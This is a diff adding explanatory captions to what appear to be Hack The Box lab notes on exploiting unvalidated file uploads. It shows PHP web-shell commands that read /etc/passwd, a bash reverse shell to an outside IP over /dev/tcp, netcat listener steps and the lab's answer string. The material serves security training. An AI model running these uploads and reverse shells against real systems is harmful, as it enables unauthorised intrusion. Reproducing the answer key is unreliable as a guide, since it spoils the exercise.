@@ -28,6 +28,7 @@ curl -sk -I "http://TARGET/" | grep -i 'server\|x-powered-by'
 
 # Wappalyzer (browser extension) gives the full stack: server, language, libs
 ```
+> Identifies the server language so you know which shell extension to upload. A 200 response on `index.php` means PHP is running. The `Server:` and `X-Powered-By:` headers often reveal the stack directly.
 
 | Stack hint | Web shell extension |
 |------------|--------------------|
@@ -50,6 +51,7 @@ curl -sk "http://TARGET/uploads/test.php"
 # → "Hello HTB"   ✅ PHP is being executed
 # → "<?php echo..." ❌ file is being served as text, not executed
 ```
+> Tests with a safe echo script before uploading a real shell. If the server returns `Hello HTB`, PHP executes your code. If it returns the raw source, the extension isn't mapped to PHP.
 
 **Three possible outcomes:**
 
@@ -78,6 +80,7 @@ curl "http://TARGET/uploads/shell.php?cmd=id"
 curl "http://TARGET/uploads/shell.php?cmd=hostname"
 curl "http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd"
 ```
+> Uploads a one-liner web shell and runs OS commands through it. The `cmd=` parameter passes each command to `system()`. Use `+` to represent spaces in the URL.
 
 ---
 
@@ -93,6 +96,7 @@ Web shell first → confirm RCE → upgrade to reverse shell if needed:
 ```bash
 curl "http://TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.17.176/4444+0>%261'"
 ```
+> Triggers a bash reverse shell through the web shell. The `%26` and `%261` are URL-encoded `&` characters. Replace the IP with your tun0 address.
 
 Or upload a dedicated reverse-shell PHP script:
 ```bash
@@ -107,6 +111,7 @@ nc -lvnp 4444
 # Trigger
 curl "http://TARGET/uploads/rev.php"
 ```
+> Uses pentestmonkey's pre-built PHP reverse shell. `sed` patches the IP and port in-place. Start the listener before triggering the shell request.
 
 ---
 
@@ -127,6 +132,7 @@ for d in uploads upload files attachments avatars profile_images media documents
   echo "/$d/ → $code"
 done
 ```
+> Three ways to find the upload storage path. The response headers often give it away. If not, inspect pages that display your file, or brute-force common directory names.
 
 Common upload directories:
 ```
@@ -159,6 +165,7 @@ curl -sk -X POST "http://154.57.164.66:31723/upload.php" \
 curl -sk "http://154.57.164.66:31723/uploads/host.php"
 # → ng-2393564-fileuploadsabsentverification-zaizk-86d944c489-zkwbj
 ```
+> Uploads a minimal PHP file that runs `hostname`. The second curl request triggers it. The long hyphenated output is the Kubernetes pod name — that is the answer.
 
 **Answer:** `ng-2393564-fileuploadsabsentverification-zaizk-86d944c489-zkwbj`
 
